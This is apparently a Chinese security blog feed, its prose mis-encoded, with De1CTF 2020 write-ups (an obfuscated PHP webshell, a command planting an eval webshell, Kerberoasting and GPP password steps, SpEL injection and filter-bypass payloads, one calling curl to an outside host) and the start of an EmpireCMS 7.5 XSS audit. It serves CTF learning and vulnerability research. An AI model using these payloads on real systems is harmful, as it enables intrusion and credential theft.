<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_=[]<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_=@<span class="string">"$_"</span><span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>= $___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____=<span class="string">'_'</span><span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_=$$____<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_[__]($_[_])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/De1CTF2020-å¤ç°/image-20200511210746555.png" alt="image-20200511210746555"></p>
<p>å†åˆ©ç”¨è¿™ä¸ªé©¬å†™ä¸€ä¸ªæ–°çš„é©¬</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">__</span>=system&amp;_=echo ^&lt;?php eval(<span class="variable">$_POST</span>[<span class="string">'a'</span>])<span class="comment">; &gt; a.php</span></span><br></pre></td></tr></table></figure>

<p>åœ¨windowä¸‹ <code>^</code>è¡¨ç¤ºè½¬ä¹‰</p>
<p>æ—¢ç„¶æ˜¯åŸŸæ¸—é€ï¼Œå½“ç„¶å¾—æœ‰ä¸ªé«˜çº§ç‚¹çš„shellï¼Œæˆ‘æ˜¯ç”¨frpæŠŠkaliçš„ç«¯å£è½¬å‘åˆ°å…¬ç½‘vpsï¼Œç„¶åç”¨èšå‰‘å›å¼¹äº†CS shell</p>
<p>ç„¶åç”¨å¯¹åŸŸå†…è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå‘ç°äº†Hint</p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/1.jpg" alt="1"></p>
<p>æ‰“å¼€Hintå‘ç°äº†ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…</p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/2.jpg" alt="2"></p>
<p>åé¢æ˜¯åˆ©ç”¨åˆ©ç”¨<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">SYSVOLè¿˜åŸç»„ç­–ç•¥</a>ä¸­ä¿å­˜çš„å¯†ç </p>
<p>ç„¶åæ¥ç€æ”¶é›†ä¿¡æ¯</p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/3.jpg" alt="3"></p>
<p>å‘ç°äº†HintZip_Passç”¨æˆ·</p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/4.jpg" alt="4"></p>
<p>å…¶OUæ˜¯Zip_Password</p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/5.jpg" alt="5"></p>
<p>ç„¶åæœ‰ä¸ªgplinkï¼Œç„¶åå¯¹è¿™ä¸ªGPOä¿¡æ¯æ”¶é›†</p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/6.jpg" alt="6"></p>
<p>åé¢ç”¨Get-GPPPassword.ps1æŠ¥é”™äº†</p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/7.jpg" alt="7"></p>
<p>åé¢æŠŠcpasswordå¤åˆ¶ä¸‹æ¥ ç”¨gpp-decryptè§£å¯†</p>
<p>ä¹‹æ‰€ä»¥èƒ½è§£å¯†ï¼Œæ˜¯å¾®è½¯å…¬å¸ƒäº†<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN" target="_blank" rel="noopener">ç§é’¥</a></p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/image-20200514114823222.png" alt="image-20200514114823222"></p>
<p>è§£å‹åï¼Œé‡Œé¢æœ‰flagå’Œç¬¬äºŒå…³çš„æç¤º</p>
<p>æ ¹æ®æç¤ºå¯¹De1taç”¨æˆ·è¿›è¡Œä¿¡æ¯æ”¶é›†</p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/8.jpg" alt="8"></p>
<p>å‘ç°webç”¨æˆ·å¯¹De1taç”¨æˆ·çš„servicePrincipalNameå…·æœ‰å†™æƒé™ï¼Œç„¶åå¯ä»¥é€šè¿‡webç”¨æˆ·ç»™De1taç”¨æˆ·è®¾ç½®spnç„¶åé€šè¿‡Kerberoastingè·å–hashï¼Œæœ¬åœ°æš´åŠ›ç ´è§£å¯†ç </p>
<p>ç»™De1taç”¨æˆ·è®¾ç½®spn</p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/9.jpg" alt="9"></p>
<p>æ¥ç€ç”¨Rubeusè·å–SPNçš„hashã€‚åé¢å†™çš„æ—¶å€™ç¯å¢ƒçªç„¶æ²¡äº† ï¼Œå†…ç½‘æ¼«æ¸¸ç»“æŸäº†</p>
<h4 id="4-calc"><a href="#4-calc" class="headerlink" title="4.calc"></a>4.calc</h4><p>javawebåŸºæœ¬æ²¡æ¥è§¦è¿‡ï¼Œçœ‹äº†äº›ç½‘ä¸Šçš„æ–‡ç« ç®—æ˜¯å­¦ä¹ å§</p>
<p>æ²¡äº†è§£è¿‡ELè¡¨è¾¾å¼ çš„å¯ä»¥çœ‹çœ‹è¿™ç¯‡<a href="https://xz.aliyun.com/t/7692#toc-12" target="_blank" rel="noopener">æ–‡ç« </a></p>
<p>ä»è®¡ç®—å™¨é¡µé¢çš„æ ‡ç­¾å›¾æ ‡çœ‹ï¼Œæ˜¯ä¸€ä¸ªSpringæ¡†æ¶ï¼Œè€ŒæŠ“åŒ…çœ‹GETè¯·æ±‚åˆ™æ˜¯æš—ç¤ºspelè¡¨è¾¾å¼æ³¨å…¥</p>
<p>å¸¸è§payload</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="number">12</span>*<span class="number">12</span>&#125;</span><br><span class="line"><span class="function"><span class="title">T</span><span class="params">(java.lang.Runtime)</span></span>.getRuntime().exec(<span class="string">"nslookup a.com"</span>)</span><br><span class="line"><span class="function"><span class="title">T</span><span class="params">(Thread)</span></span>.sleep(<span class="number">10000</span>)</span><br><span class="line"><span class="string">''</span>.getClass().forName(<span class="string">'java.lang.Runtime'</span>).getRuntime().exec(<span class="string">'nslookup a.com'</span>)</span><br><span class="line">new java<span class="selector-class">.lang</span>.ProcessBuilder(&#123;<span class="string">'nslookup a.com'</span>&#125;).start()</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>[<span class="string">'class'</span>].forName(<span class="string">'java.lang.Runtime'</span>).getDeclaredMethods()[<span class="number">15</span>].invoke(<span class="string">''</span>[<span class="string">'class'</span>].forName(<span class="string">'java.lang.Runtime'</span>).getDeclaredMethods()[<span class="number">7</span>].invoke(null),<span class="string">'curl 172.17.0.1:9898'</span>)</span><br></pre></td></tr></table></figure>

<p>å…ˆFuzzå‘ç°è¿‡æ»¤äº†ä¸€äº›å…³é”®å­—</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line">ProcessBuilder</span><br><span class="line"><span class="keyword">string</span></span><br><span class="line"><span class="keyword">new</span></span><br><span class="line">getclass</span><br><span class="line">java.lang</span><br><span class="line">Runtime</span><br><span class="line">T(</span><br><span class="line"><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>å› ä¸ºç›®çš„æ˜¯è¯»æ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥å…ˆä¸å…³æ³¨å‘½ä»¤æ‰§è¡Œã€‚ä½†ä¸ç®¡ä»€ä¹ˆç›®çš„ï¼Œè‡´å‘½çš„æ˜¯ <code>new</code>å…³é”®å­—è¢«æ‹¦æˆªï¼Œæ— æ³•åˆ›å»ºå¯¹è±¡å®ä¾‹ã€‚è¿™å¯èƒ½å¯¼è‡´å¾ˆå¤šæŠ€å·§æ— æ³•ä½¿ç”¨ã€‚</p>
<p>1.ä½†ä¾ç„¶å¯ä»¥æ‰¾åˆ°åˆé€‚çš„é™æ€æ–¹æ³•æ‰§è¡Œä»£ç è¯»å–flag</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">java.nio.file.<span class="module-access"><span class="module"><span class="identifier">Files</span>.</span></span>read<span class="constructor">AllLines(<span class="params">java</span>.<span class="params">nio</span>.<span class="params">file</span>.Paths.<span class="params">get</span>(<span class="string">"/flag"</span>)</span>, java.nio.charset.<span class="module-access"><span class="module"><span class="identifier">Charset</span>.</span></span>default<span class="constructor">Charset()</span>)</span><br></pre></td></tr></table></figure>

<p>è½¬æˆSpELè¯­æ³•</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="constructor">T(<span class="params">java</span>.<span class="params">nio</span>.<span class="params">file</span>.Files)</span>.read<span class="constructor">AllLines(T(<span class="params">java</span>.<span class="params">nio</span>.<span class="params">file</span>.Paths)</span>.get('/flag'), <span class="constructor">T(<span class="params">java</span>.<span class="params">nio</span>.<span class="params">charset</span>.Charset)</span>.default<span class="constructor">Charset()</span>)</span><br></pre></td></tr></table></figure>

<p><a href="https://juejin.im/post/5cdc21626fb9a0320c5ad583" target="_blank" rel="noopener">javaçš„5ç§æ–‡ä»¶è¯»å–æ–¹æ³•</a></p>
<p>ä½†è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œ<code>T()</code>è¢«è¿‡æ»¤äº† ä½†å¯ä»¥ç”¨ <code>%00</code>ç»•è¿‡</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">T%<span class="number">00</span>(java.net.URLClassLoader).get<span class="constructor">SystemClassLoader()</span>.load<span class="constructor">Class(<span class="string">"java.nio.file.Files"</span>)</span>.read<span class="constructor">AllLines(T%00(<span class="params">java</span>.<span class="params">net</span>.URLClassLoader)</span>.get<span class="constructor">SystemClassLoader()</span>.load<span class="constructor">Class(<span class="string">"java.nio.file.Paths"</span>)</span>.get(<span class="string">"/flag"</span>))</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œé¡ºä¾¿æä¸€ä¸‹ T()å’Œ%00</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">T</span>()  è°ƒç”¨ä¸€ä¸ªç±»çš„é™æ€æ–¹æ³•ï¼Œå®ƒå°†è¿”å›ä¸€ä¸ª <span class="variable">Class</span> <span class="variable"><span class="class">Object</span></span>ï¼Œä¼šè°ƒç”¨ç±»ä½œç”¨åŸŸçš„æ–¹æ³•å’Œå¸¸é‡</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">åé¢ç”¨<span class="number">0</span><span class="variable">x00</span>æˆªæ–­ç»•è¿‡å¯¹<span class="title">T</span>(çš„è¿‡æ»¤ã€‚</span></span><br></pre></td></tr></table></figure>

<p>2.åˆ©ç”¨å¤§å°å†™ç»•è¿‡newå…³é”®å­—è¿‡æ»¤</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">nEw java.io.<span class="constructor">BufferedReader(<span class="params">nEw</span> <span class="params">java</span>.<span class="params">io</span>.FileReader(<span class="string">"/flag"</span>)</span>).read<span class="constructor">Line()</span></span><br></pre></td></tr></table></figure>

<p>3.åˆ©ç”¨javaåå°„æœºåˆ¶è·å–ç±»</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">''.<span class="keyword">class</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">nio</span>.<span class="params">file</span>.Files')</span>.read<span class="constructor">AllLines(''.<span class="params">class</span>.<span class="params">forName</span>('<span class="params">java</span>.<span class="params">nio</span>.<span class="params">file</span>.Paths')</span>.get('/flag'))</span><br></pre></td></tr></table></figure>

<p>åŒç†ä¹Ÿå¯ä»¥è¾¾åˆ°RCEçš„ç›®çš„</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">''.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">la</span>'+'<span class="params">ng</span>.Ru'+'<span class="params">ntime</span>')</span>.get<span class="constructor">Method('<span class="params">ex</span>'+'<span class="params">ec</span>',''.<span class="params">getClass</span>()</span>).invoke(''.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">la</span>'+'<span class="params">ng</span>.Ru'+'<span class="params">ntime</span>')</span>.get<span class="constructor">Method('<span class="params">getRu</span>'+'<span class="params">ntime</span>')</span>.invoke(null),'calc')</span><br></pre></td></tr></table></figure>

<p>payloadåˆ†æ</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">''.get<span class="constructor">Class()</span></span><br><span class="line"><span class="comment">// class java.lang.String</span></span><br><span class="line"></span><br><span class="line">''.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">la</span>'+'<span class="params">ng</span>.Ru'+'<span class="params">ntime</span>')</span></span><br><span class="line"><span class="comment">// class java.lang.Runtime</span></span><br><span class="line"></span><br><span class="line">''.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">la</span>'+'<span class="params">ng</span>.Ru'+'<span class="params">ntime</span>')</span>.get<span class="constructor">Method('<span class="params">ex</span>'+'<span class="params">ec</span>',''.<span class="params">getClass</span>()</span>)</span><br><span class="line"><span class="comment">// public java.lang.Process java.lang.Runtime.exec(java.lang.String) throws java.io.IOException</span></span><br><span class="line"></span><br><span class="line">''.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">la</span>'+'<span class="params">ng</span>.Ru'+'<span class="params">ntime</span>')</span>.get<span class="constructor">Method('<span class="params">getRu</span>'+'<span class="params">ntime</span>')</span></span><br><span class="line"><span class="comment">// public static java.lang.Runtime java.lang.Runtime.getRuntime()</span></span><br><span class="line"></span><br><span class="line">''.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">la</span>'+'<span class="params">ng</span>.Ru'+'<span class="params">ntime</span>')</span>.get<span class="constructor">Method('<span class="params">getRu</span>'+'<span class="params">ntime</span>')</span>.invoke(null)</span><br><span class="line"><span class="comment">// java.lang.Runtime@c2939a</span></span><br><span class="line"></span><br><span class="line">''.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">la</span>'+'<span class="params">ng</span>.Ru'+'<span class="params">ntime</span>')</span>.get<span class="constructor">Method('<span class="params">ex</span>'+'<span class="params">ec</span>',''.<span class="params">getClass</span>()</span>).invoke(''.get<span class="constructor">Class()</span>.for<span class="constructor">Name('<span class="params">java</span>.<span class="params">la</span>'+'<span class="params">ng</span>.Ru'+'<span class="params">ntime</span>')</span>.get<span class="constructor">Method('<span class="params">getRu</span>'+'<span class="params">ntime</span>')</span>.invoke(null),'calc')</span><br><span class="line"><span class="comment">// java.lang.ProcessImpl@f2f85c</span></span><br></pre></td></tr></table></figure>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p>è®°å½•å‡ é“æœ‰æ„æ€çš„å§</p>
<h4 id="1-mc-easybgm"><a href="#1-mc-easybgm" class="headerlink" title="1.mc_easybgm"></a>1.mc_easybgm</h4><p>mp3çš„æ¯ä¸€å¸§çš„ç¬¬24ä½æ˜¯ä¸€ä¸ªä¿ç•™ä½ï¼Œå¯ä»¥ç”¨æ¥éšå†™å…·ä½“çœ‹å›¾</p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/image-20200521215418475.png" alt="image-20200521215418475"></p>
<p>å…·ä½“çš„åŠ è§£å¯†çœ‹<a href="https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/misc/mc_easybgm/mp3.py" target="_blank" rel="noopener">è„šæœ¬</a></p>
<p><img src="/2020/05/De1CTF2020-å¤ç°/image-20200521215823502.png" alt="image-20200521215823502"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>De1</tag>
      </tags>
  </entry>
  <entry>
    <title>EmpireCMSv7.5ä»£ç å®¡è®¡</title>
    <url>/2021/03/EmpireCMSv7-5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="å®¡è®¡ç¯å¢ƒ"><a href="#å®¡è®¡ç¯å¢ƒ" class="headerlink" title="å®¡è®¡ç¯å¢ƒ"></a>å®¡è®¡ç¯å¢ƒ</h3><p>PHP7.0</p><p>Apache</p><p>PHPSTORM</p><p>ç¯å¢ƒä¸Šæ²¡é‡åˆ°å•¥é—®é¢˜</p><h3 id="å‰å°XSS"><a href="#å‰å°XSS" class="headerlink" title="å‰å°XSS"></a>å‰å°XSS</h3><ul>
<li><p>æ¼æ´åˆ†æ</p>
<p>éœ€è¦å¼€å¯ä¼šå‘˜ç©ºé—´</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-18%20212902.png" alt="å±å¹•æˆªå›¾ 2021-03-18 212902"></p>
<p>é—®é¢˜ä»£ç åœ¨<code>/e/ViewImg/index.html</code> ï¼ŒRequestè·å–urlçš„å‚æ•°,æ²¡æœ‰ç»è¿‡ä»»ä½•è¿‡æ»¤,ç›´æ¥å½“ä½œaæ ‡ç­¾å’Œimgæ ‡ç­¾çš„hrefå±æ€§å’Œsrcå±æ€§è¾“å‡ºã€‚</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/image-20210318214012537.png" alt="image-20210318214012537"></p>
<p>è·Ÿè¿›<code>Request</code></p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/image-20210318215455754.png" alt="image-20210318215455754"></p>
<p>é€šè¿‡window.locationè·å–å½“å‰urlåœ°å€,æ ¹æ®ä¼ å…¥çš„urlå‚æ•°,è·å–å½“å‰å‚æ•°çš„èµ·å§‹ä½ç½®å’Œç»“æŸä½ç½®ã€‚</p>
<p>ä¾‹å¦‚,<code>index.html?url=javascript:alert(document.cookie)</code>,ç»è¿‡Requestå‡½æ•°å¤„ç†å°±å˜æˆ<code>javascript:alert(document.cookie)</code></p>
<p>urlåœ°å€ç»è¿‡Requestå‡½æ•°å¤„ç†ä¹‹å,ç„¶åæŠŠurlåœ°å€ä¸­çš„å‚æ•°å’Œå€¼éƒ¨åˆ†ç›´æ¥æ‹¼æ¥å½“ä½œaæ ‡ç­¾çš„hrefå±æ€§çš„å€¼å’Œimgæ ‡ç­¾çš„srcæ ‡ç­¾çš„å€¼ã€‚</p>
<p>æ‰€ä»¥æ„é€ payloadï¼š<code>url=javascript:alert(/xss/)</code></p>
</li>
<li><p>æ¼æ´å¤ç°</p>
<p>è®¿é—®<code>http://172.16.43.200:9093/e/ViewImg/index.html?url=javascript:alert(/xss/)</code>,ç‚¹å‡»å›¾ç‰‡è§¦å‘ã€‚</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/image-20210318220355099.png" alt="image-20210318220355099"></p>
</li>
</ul><a id="more"></a>




<h3 id="åå°æ–‡ä»¶ä¸Šä¼ getshell-CVE-2018-18086"><a href="#åå°æ–‡ä»¶ä¸Šä¼ getshell-CVE-2018-18086" class="headerlink" title="åå°æ–‡ä»¶ä¸Šä¼ getshell(CVE-2018-18086 )"></a>åå°æ–‡ä»¶ä¸Šä¼ getshell(CVE-2018-18086 )</h3><ul>
<li><p>æ¼æ´åˆ†æ</p>
